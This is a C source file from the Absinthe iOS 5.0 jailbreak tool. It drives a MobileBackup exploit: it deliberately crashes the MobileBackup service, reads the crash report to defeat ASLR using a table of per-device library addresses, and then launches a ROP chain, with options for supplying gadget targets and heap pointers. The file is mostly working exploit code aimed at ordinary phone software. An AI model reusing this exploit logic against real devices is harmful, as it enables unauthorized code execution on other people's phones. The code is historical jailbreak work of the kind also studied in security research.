/**
 * GreenPois0n Absinthe - absinthe.c
 * Copyright (C) 2010 Chronic-Dev Team
 * Copyright (C) 2010 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>

#include <sys/signal.h>
#include <plist/plist.h>

#include "mb1.h"
#include "rop.h"
#include "debug.h"
#include "device.h"
#include "boolean.h"
#include "dictionary.h"
#include "crashreporter.h"
#include "idevicepair.h"

#include "dyldcache.h"

#include "offsets.h"

#ifdef WIN32
#define sleep(x) Sleep(x*1000)
#endif

struct dev_vmaddr {
	const char* product;
	const char* build;
	uint32_t vmaddr;
};

static struct dev_vmaddr devices_vmaddr_libcopyfile[] = {
	// iOS 5.0.1
	{ "iPad1,1", "9A405", 0x3012f000 },
	{ "iPad2,1", "9A405", 0 },
	{ "iPad2,2", "9A405", 0 },
	{ "iPad2,3", "9A405", 0 },
	{ "iPhone2,1", "9A405", 0x34a52000 },
	{ "iPhone3,1", "9A405", 0x30654000 },
	{ "iPhone3,3", "9A405", 0 },
	{ "iPhone4,1", "9A405", 0x31f54000 },
	{ "iPhone4,1", "9A406", 0x31f57000 },
	{ "iPod3,1", "9A405", 0x35202000 },
	{ "iPod4,1", "9A405", 0x30c29000 },
	{ NULL, NULL, 0 }
};

/////////////////////////////////////////////////////////////////////////////////////////
/// TODO: We need to add an event handler for when devices are connected. This handler //
///         needs to wait for iTunes to autostart and kill it before it can start the  //
///         syncing process and mess up our connection.                                //
/////////////////////////////////////////////////////////////////////////////////////////

static struct option longopts[] = {
	{ "help",        no_argument,         NULL,   'h' },
	{ "verbose",     required_argument,   NULL,   'v' },
	{ "uuid",        required_argument,   NULL,   'u' },
	{ "target",      required_argument,   NULL,   't' },
	{ "pointer",     required_argument,   NULL,   'p' },
	{ "aslr-slide",  required_argument,   NULL,   'a' },
	{ NULL, 0, NULL, 0 }
};

void status_plist_cb(plist_t* newplist, void *userdata) {
	debug("Status plist callback invoked!!!\n");
}

void attack_plist_cb(plist_t* newplist, void *userdata){
	*newplist = plist_new_string("___EmptyParameterString___");
	debug("Attack plist callback invoked!!!\n");
}

crashreport_t* fetch_crashreport(device_t* device) {
	// We open crashreporter so we can download the mobilebackup2 crashreport
	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
	debug("Opening connection to CrashReporter service\n");
	crashreporter_t* reporter = crashreporter_connect(device);
	if (reporter == NULL) {
		error("Unable to open connection to crash reporter\n");
		return NULL;
	}

	// Read in the last crash since that's probably our fault anyways. Since dylib
	//  addresses are only randomized on boot, we now have base addresses to
	//  calculate the addresses of our ROP gadgets we need.
	debug("Reading in crash reports from mobile backup\n");
	crashreport_t* crash = crashreporter_last_crash(reporter);
	if (crash == NULL) {
		error("Unable to read last crash\n");
		return NULL;
	}
	crashreporter_free(reporter);
	return crash;
}

crashreport_t* crash_mobilebackup(device_t* device) {
	crashreport_t* crash = NULL;
	mb1_t* mb1 = mb1_connect(device);
	if(mb1) {
		if (mb1_crash(mb1)) {
			fprintf(stderr, "successfully crashed mb1. waiting some time for the device to write the crash report...\n");
			sleep(5);
			crash = fetch_crashreport(device);
		} else {
			fprintf(stderr, "could not crash mb1...\n");
		}
	}
	mb1_free(mb1);
	return crash;
}

unsigned long find_aslr_slide(crashreport_t* crash, char* cache) {
	unsigned long slide = 0;
	if(crash == NULL || cache == NULL) {
		error("Invalid arguments\n");
		return 0;
	}

	dyldcache_t* dyldcache = dyldcache_open(cache);
	if(dyldcache != NULL) {
		dyldcache_free(dyldcache);
	}
	return slide;
}

void usage(int argc, char* argv[]) {
	char* name = strrchr(argv[0], '/');
	printf("Usage: %s [OPTIONS]\n", (name ? name + 1 : argv[0]));
	printf("(c) 2011-2012, Chronic-Dev LLC\n");
	printf("Jailbreak iOS5.0 using ub3rl33t MobileBackup2 exploit.\n");
	//printf("Discovered by Nikias Bassen, Exploited by Joshua Hill\n");
	printf("  General\n");
	printf("    -h, --help\t\t\tprints usage information\n");
	printf("    -v, --verbose\t\tprints debuging info while running\n");
	printf("    -u, --uuid UUID\t\ttarget specific device by its 40-digit device UUID\n");
	printf("\n  Payload Generation\n");
	printf("    -t, --target ADDRESS\toffset to ROP gadget we want to execute\n");
	printf("    -p, --pointer ADDRESS\theap address we're hoping contains our target\n");
	printf("    -a, --aslr-slide OFFSET\tvalue of randomized dyldcache slide\n");
	printf("\n");
}

int main(int argc, char* argv[]) {
	int opt = 0;
	int optindex = 0;

	int verbose = 0;
	unsigned long aslr_slide = 0;
	unsigned long pointer = 0;
	unsigned long target = 0;
	char* uuid = NULL;

	char* build = NULL;
	char* product = NULL;

#ifndef WIN32
	signal(SIGPIPE, SIG_IGN);
#endif

	while ((opt = getopt_long(argc, argv, "hva:p:t:u:", longopts, &optindex)) > 0) {
		switch (opt) {
		case 'h':
			usage(argc, argv);
			return 0;

		case 'v':
			verbose++;
			break;

		case 'a':
			aslr_slide = strtoul(optarg, NULL, 0);
			break;

		case 'p':
			pointer = strtoul(optarg, NULL, 0);
			break;

		case 't':
			target = strtoul(optarg, NULL, 0);
			break;

		case 'u':
			uuid = optarg;
			break;

		default:
			usage(argc, argv);
			return -1;
		}
	}

	if ((argc-optind) == 0) {
		argc -= optind;
		argv += optind;

	} else {
		usage(argc, argv);
		return -1;
	}

	idevicepair();
	idevicevalidate();

	// Open a connection to our device
	debug("Opening connection to device\n");
	device_t* device = device_create(uuid);
	if(device == NULL) {
		error("Unable to open device\n");
		return -1;
	}

	lockdown_t* lockdown = lockdown_open(device);
	if (lockdown == NULL) {
		error("Lockdown connection failed\n");
		device_free(device);
		return -1;
	}

	if ((lockdown_get_string(lockdown, "ProductType", &product) != LOCKDOWN_E_SUCCESS)
			|| (lockdown_get_string(lockdown, "BuildVersion", &build) != LOCKDOWN_E_SUCCESS)) {
		error("Could not get device information\n");
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}

	// find product type and build version
	int i = 0;
	uint32_t libcopyfile_vmaddr = 0;
	while (devices_vmaddr_libcopyfile[i].product) {
		if (!strcmp(product, devices_vmaddr_libcopyfile[i].product)
		    && !strcmp(build, devices_vmaddr_libcopyfile[i].build)) {
			libcopyfile_vmaddr = devices_vmaddr_libcopyfile[i].vmaddr;
			debug("Found libcopyfile.dylib address in database of 0x%x\n", libcopyfile_vmaddr);
			break;
		}
		i++;
	}

	if (libcopyfile_vmaddr == 0) {
		error("Error: device %s is not supported.\n", product);
		free(product);
		device_free(device);
		return -1;
	}

	// Crash MobileBackup so we can grab a fresh crashreport
	debug("Grabbing a fresh crashreport for this device\n");
	crashreport_t* crash = crash_mobilebackup(device);
	if(crash == NULL) {
		error("Unable to get fresh crash from mobilebackup\n");
		device_free(device);
		return -1;
	}

	i = 0;
	uint32_t dscs = 0;
	while (crash->dylibs && crash->dylibs[i]) {
		if (!strcmp(crash->dylibs[i]->name, "libcopyfile.dylib")) {
			debug("Found libcopyfile.dylib address in crashreport of 0x%x\n", crash->dylibs[i]->offset);
			dscs = crash->dylibs[i]->offset - libcopyfile_vmaddr;
		}
		i++;
	}

	printf("0x%x\n", dscs);

	ropMain(dscs);

	if(device) device_free(device);
	return 0;
}
